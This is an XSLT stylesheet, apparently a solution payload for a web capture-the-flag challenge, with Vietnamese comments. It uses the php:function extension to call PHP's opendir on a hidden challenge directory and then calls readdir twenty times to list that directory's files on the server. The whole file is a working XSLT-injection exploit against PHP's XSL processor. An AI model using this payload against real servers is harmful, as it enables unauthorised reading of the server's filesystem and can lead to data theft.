<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">

    <!--in plain text -->
    <xsl:output method="text" omit-xml-declaration="yes"/>

    <xsl:template match="/">

        <!-- Mở thư mục challenge-->
        <xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/')"/>
        <xsl:text>&#x0A;</xsl:text>

        <!-- Gọi readdir() nhiều lần-->
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>
        <xsl:value-of select="php:function('readdir')"/><xsl:text>&#x0A;</xsl:text>

    </xsl:template>
</xsl:stylesheet>
